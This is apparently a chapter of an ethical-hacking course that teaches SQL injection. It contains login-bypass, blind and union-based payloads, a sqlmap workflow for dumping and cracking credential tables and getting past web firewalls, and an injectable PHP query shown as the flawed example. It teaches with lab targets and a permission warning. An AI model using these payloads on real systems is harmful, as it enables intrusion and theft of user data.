# Day 19 — Exploitation: SQL Injection (SQLi)

> 📚 Part of the **"Learn Ethical Hacking in 30 Days"** series.  
> Previous: [Day 18 — Password Attacks with Hydra](#) | Next: [Day 20](#)

---

## 📋 Table of Contents

1. [What is SQL Injection?](#1-what-is-sql-injection)
2. [How SQL Works (Background)](#2-how-sql-works-background)
3. [Essential SQL Commands](#3-essential-sql-commands)
4. [How SQLi Works — The Core Logic](#4-how-sqli-works--the-core-logic)
5. [Type 1: Error-Based / Classic SQLi](#5-type-1-error-based--classic-sqli)
6. [Type 2: Login Bypass with SQLi](#6-type-2-login-bypass-with-sqli)
7. [Type 3: Blind SQL Injection](#7-type-3-blind-sql-injection)
8. [Type 4: Union-Based SQL Injection](#8-type-4-union-based-sql-injection)
9. [Tool: sqlmap (Automated SQLi)](#9-tool-sqlmap-automated-sqli)
10. [Quick Reference Cheat Sheet](#10-quick-reference-cheat-sheet)

---

## 1. What is SQL Injection?

**SQL Injection (SQLi)** is an attack where malicious SQL queries are injected into an application's input fields to manipulate the backend database.

**What a successful SQLi can do:**

| Action | Description |
|--------|-------------|
| **Read sensitive data** | Dump usernames, passwords, credit card numbers |
| **Modify data** | Insert, update, or delete records |
| **Bypass authentication** | Log in without valid credentials |
| **Administrative operations** | Drop tables, shut down the database |
| **OS command execution** | In some cases, run commands on the server |

> 💡 SQL Injection is part of the **OWASP Top 10** — the most critical web application security risks. It falls under the **Injection** category.

---

## 2. How SQL Works (Background)

**SQL (Structured Query Language)** is the language used to interact with databases.

**How a web application uses SQL:**

```
[User] → fills login form
        ↓
[Web App] → builds SQL query using input
        ↓
[Database] → executes query, returns result
        ↓
[Web App] → shows result to user
```

**Example (e-commerce site):**
- Database stores: product names, prices, images, user accounts
- When user clicks "Buy Now" → app sends SQL query to database
- Database returns product details → shown to user

**The problem:** If user input is not properly sanitized, an attacker can inject malicious SQL code into that query.

---

## 3. Essential SQL Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `SELECT` | Retrieve data from database | `SELECT * FROM users` |
| `FROM` | Specify which table | `SELECT name FROM users` |
| `WHERE` | Filter by condition | `WHERE username = 'john'` |
| `UNION` | Combine results of two SELECT statements | `SELECT a UNION SELECT b` |
| `--` or `#` | Comment out rest of query | `' OR 1=1 --` |
| `ORDER BY` | Sort results | `ORDER BY 1` |
| `AND` | Both conditions must be true | `WHERE user='x' AND pass='y'` |
| `OR` | Either condition can be true | `WHERE 1=1 OR 1=1` |

> 💡 **Key fact:** `1=1` is always **TRUE** in SQL. This is the foundation of many SQL injection payloads.

---

## 4. How SQLi Works — The Core Logic

**Backend PHP code example:**
```php
$username = $_GET['username'];
$result = "SELECT * FROM users WHERE username = '$username'";
```

**Normal request:**
```
URL: /profile?username=john
Query: SELECT * FROM users WHERE username = 'john'
```

**SQL Injection — adding an extra quote:**
```
URL: /profile?username=john'
Query: SELECT * FROM users WHERE username = 'john''
                                                   ^
                                             breaks the query!
```

**The injection logic — 3 steps:**

```
Step 1: BREAK — inject a quote (') to break the SQL syntax
Step 2: INJECT — add your own SQL payload
Step 3: FIX — comment out the rest with -- or #
```

---

## 5. Type 1: Error-Based / Classic SQLi

**How to test for SQLi:**

1. Add a single quote `'` to any input field or URL parameter
2. If you get a SQL error → the parameter is likely vulnerable

**Example URL test:**
```
Original: http://site.com/item?id=1
Test:     http://site.com/item?id=1'
```

**Common basic payload:**
```
' AND 1=1 --+
```

What each part does:
```
'        → breaks the original SQL quote
AND 1=1  → always TRUE condition
--+      → comments out the rest of the query
```

**Why `AND 1=1`?**
- `1=1` is always TRUE
- Even if the first part breaks, the `AND 1=1` forces the query to succeed
- All database records may be returned

---

## 6. Type 2: Login Bypass with SQLi

### The vulnerable backend query

```sql
SELECT username, password FROM users
WHERE username = '[INPUT]' AND password = '[INPUT]'
```

### The attack

**In the username field, enter:**
```
' OR TRUE --
```

or

```
admin'--
```

**What the backend query becomes:**
```sql
SELECT username, password FROM users
WHERE username = '' OR TRUE -- ' AND password = ''
                              ^
                       everything after -- is ignored (comment)
```

**Why it works:**
- `'` breaks the original username quote
- `OR TRUE` → `OR 1=1` → always true condition
- `--` comments out the password check entirely
- Password is never verified → login succeeds!

### Payload variations to try

```
' OR 1=1 --
' OR 1=1 --+
' OR 1=1 #
admin'--
' OR TRUE --
' OR 'x'='x
```

> ⚠️ **Try both username AND password fields** — the vulnerability may exist in either one. Also try with and without spaces as the space character sometimes affects execution.

### Practice output

After successful login bypass, the database may also dump records. Example:

```
Username: s4mi  Password: [md5_hash]
Username: john  Password: [md5_hash]
Username: skidy Password: [md5_hash]
```

MD5 hashes can be cracked at [crackstation.net](https://crackstation.net)

---

## 7. Type 3: Blind SQL Injection

**When does it apply?**  
When the application doesn't show SQL errors — the developer has hidden error messages. You can't see what's happening, so you ask **yes/no questions** via the query.

```
Normal SQLi:  You see errors → understand query structure → inject
Blind SQLi:   No errors visible → ask true/false questions → slowly extract data
```

### How it works

Use the SQL `SUBSTRING()` function to guess data one character at a time:

```sql
' AND SUBSTRING((SELECT database()), 1, 1) = 'a' --
' AND SUBSTRING((SELECT database()), 1, 1) = 'b' --
' AND SUBSTRING((SELECT database()), 1, 1) = 'c' --
```

**Logic:**
- If the page behaves **normally** → answer is YES (character matches)
- If the page changes / shows error → answer is NO (wrong character)

**Example — guessing database name:**
```
Database name: "users"
Round 1: Is character 1 = 'u'? → YES (page normal)
Round 2: Is character 2 = 's'? → NO (page changes) → try 's' → YES
...and so on for each character
```

> ⚠️ **Blind SQLi is slow** — each character requires multiple requests. In practice, use sqlmap to automate this.

---

## 8. Type 4: Union-Based SQL Injection

**Purpose:** Fastest method for database enumeration — combines results from multiple SELECT statements.

**Three stages:**

### Stage 1: Find number of columns

Use `ORDER BY` to determine column count:

```sql
' ORDER BY 1 --    → no error
' ORDER BY 2 --    → no error
' ORDER BY 3 --    → no error
' ORDER BY 4 --    → ERROR! → means 3 columns exist
```

Or use `UNION SELECT NULL`:
```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --   → no error = 3 columns
```

**Rule:** No error = number of NULLs matches number of columns

### Stage 2: Find columns with useful data types

Test which columns accept string data:
```sql
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --
' UNION SELECT NULL, NULL, 'a' --
```
No error = that column accepts strings → can be used to extract data.

### Stage 3: Extract data

```sql
' UNION SELECT username, password, NULL FROM users --
```

**What you can extract with Union SQLi:**

| Query | What it returns |
|-------|----------------|
| `SELECT database()` | Current database name |
| `SELECT user()` | Current DB user running the query |
| `SELECT version()` | Database version |
| `SELECT table_name FROM information_schema.tables` | All table names |
| `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | Column names of a table |
| `SELECT username, password FROM users` | User credentials |

---

## 9. Tool: sqlmap (Automated SQLi)

**sqlmap** automates all SQLi testing and exploitation — including blind, union-based, and error-based attacks.

**Pre-installed on Kali Linux.**

### Method 1: Direct URL testing

```bash
sqlmap -u "http://target.com/page?id=1"
```

### Method 2: Using a captured Burp Suite request (recommended)

**Step 1:** Capture the vulnerable request in Burp Suite
- Enable FoxyProxy → Burp Suite
- Turn Intercept ON
- Trigger the vulnerable action (search, profile load, etc.)
- In Burp: right-click request → **Save item**
- Save as `request.txt`

**Step 2:** Run sqlmap with the saved request

```bash
sqlmap -r request.txt
```

### Common sqlmap flags

| Flag | Description |
|------|-------------|
| `-u` | Target URL |
| `-r` | Load request from file (Burp capture) |
| `--dbs` | Enumerate all databases |
| `-D <db>` | Specify database to use |
| `--tables` | List all tables in selected DB |
| `-T <table>` | Specify table to use |
| `--columns` | List columns in selected table |
| `--dump` | Dump all data from table |
| `--dump-all` | Dump all databases |
| `--dbms=mysql` | Specify the database type |
| `--dbms=sqlite` | For SQLite databases |
| `--tamper=space2comment` | Bypass WAF (space → comment) |
| `--level=5` | Increase test depth |
| `--risk=3` | Increase risk of tests |
| `--batch` | Non-interactive (auto-answer yes) |
| `-v` | Verbose output |

### Full enumeration workflow

```bash
# Step 1: Confirm SQLi vulnerability and find databases
sqlmap -r request.txt --dbs

# Step 2: List tables in a specific database
sqlmap -r request.txt -D <database_name> --tables

# Step 3: List columns in a specific table
sqlmap -r request.txt -D <database_name> -T <table_name> --columns

# Step 4: Dump the data
sqlmap -r request.txt -D <database_name> -T <table_name> --dump

# Dump everything at once
sqlmap -r request.txt --dump-all
```

### Using tamper scripts (WAF bypass)

```bash
sqlmap -r request.txt --tamper=space2comment --dump-all
```

### Example output

```
[*] Database: santa_panel
[*] Table: users
[+] 3 entries

| id | username | password          |
|----|----------|-------------------|
| 1  | admin    | [md5_hash]        |
| 2  | santa    | [md5_hash]        |
| 3  | elf      | [md5_hash]        |
```

---

## 10. Quick Reference Cheat Sheet

### Testing for SQLi

```
Add ' to any URL parameter or input field
If error appears → likely vulnerable!

URL example: http://site.com/page?id=1'
```

### Basic SQLi Payload Structure

```
[quote] [condition] [comment]
  '      OR 1=1      --
```

### Login Bypass Payloads

```sql
' OR 1=1 --
' OR 1=1 --+
' OR TRUE --
admin'--
' OR 'x'='x
```

### Union-Based Steps

```
1. Find columns: ' ORDER BY 1-- ... until error
2. Find string cols: ' UNION SELECT 'a',NULL,NULL--
3. Extract: ' UNION SELECT username,password,NULL FROM users--
```

### Useful Data Extraction Queries

```sql
SELECT database()               -- current database name
SELECT user()                   -- current db user
SELECT version()                -- db version
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT username, password FROM users
```

### sqlmap Quick Commands

```bash
# Test URL
sqlmap -u "http://site.com/page?id=1" --dbs

# Test from Burp request
sqlmap -r request.txt --dbs

# Full dump
sqlmap -r request.txt -D mydb -T users --dump

# With WAF bypass
sqlmap -r request.txt --tamper=space2comment --dump-all --dbms=sqlite
```

### Comment Characters by DB

| Database | Comment Syntax |
|----------|---------------|
| MySQL | `--` or `#` |
| SQLite | `--` |
| MSSQL | `--` |
| Oracle | `--` |
| PostgreSQL | `--` |

### MD5 Hash Cracking

Found MD5 hashes in database output?
- 🔗 **Crackstation:** [https://crackstation.net](https://crackstation.net)
- 🔗 **Hashes.com:** [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)

---

> ✅ **End of Day 19 Notes**  
> 📌 Next up: More web application attacks  
> 💡 Practice: TryHackMe SQLi rooms, DVWA (Damn Vulnerable Web Application), or WebGoat  
> ⚠️ Only test on applications you own or have explicit permission to test  
> 💬 Questions? Drop them in the comments!